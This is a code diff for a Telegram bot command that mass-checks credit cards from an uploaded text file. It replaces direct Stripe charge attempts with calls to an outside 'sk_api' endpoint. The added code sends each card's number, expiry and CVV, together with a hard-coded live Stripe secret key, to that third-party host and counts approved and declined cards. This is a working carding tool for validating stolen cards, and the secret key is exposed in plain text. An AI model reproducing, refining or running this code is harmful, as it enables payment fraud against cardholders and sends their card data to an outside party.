@@ -1,12 +1,9 @@
-from ANNIEMUSIC import app
+from DAXXMUSIC import app
 import aiohttp
 import asyncio
 import re
 import os
 from pyrogram import filters
-
-
-stripe.api_key = "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"
 
 CONCURRENCY_LIMIT = 1
 semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
@@ -20,40 +17,29 @@ async def process_credit_card(cc_entry, message, stats, session):
             
             ccn, mm, yy, cvv = x
 
-            # Use Stripe API to process card
-            try:
-                payment_method = stripe.PaymentMethod.create(
-                    type="card",
-                    card={
-                        "number": ccn,
-                        "exp_month": mm,
-                        "exp_year": yy,
-                        "cvc": cvv,
-                    },
-                )
+            VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
+            if not ccn.startswith(VALID):
+                return
 
-                # Create a PaymentIntent to test the card
-                payment_intent = stripe.PaymentIntent.create(
-                    amount=100,  # Amount in cents
-                    currency="usd",
-                    payment_method=payment_method.id,
-                    confirm=True,
-                )
+            url = "https://mvy.ai/sk_api/api.php"
+            params = {
+                "lista": f"{ccn}:{mm}:{yy}:{cvv}",
+                "sk": "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"
+            }
 
-                if payment_intent.status == 'succeeded':
+            async with session.get(url, params=params) as response:
+                r = await response.json()
+
+                if r['status'] == 'die':
+                    stats['declined'] += 1
+                    return None
+                elif r['status'] == 'approved':
                     stats['approved'] += 1
                     return {
                         'cc': f"{ccn}|{mm}|{yy}|{cvv}",
-                        'charge': f"${payment_intent.amount / 100}",  # Amount in dollars
-                        'message': 'Approved'
+                        'charge': f"${r['payment_info']['amount']}",
+                        'message': r.get('message', 'Approved')
                     }
-                else:
-                    stats['declined'] += 1
-                    return None
-            except stripe.error.CardError as e:
-                stats['declined'] += 1
-                return None
-
         except Exception as e:
             return f"Error processing card: {e}\n"
 
@@ -110,7 +96,4 @@ async def check_cc_file(_, message):
         else:
             await message.reply_text("Please reply to a text file containing credit card details.")
     except Exception as e:
-        await message.reply_text(f"Error reading CC file: {e}")
-
-
         await message.reply_text(f"Error reading CC file: {e}")
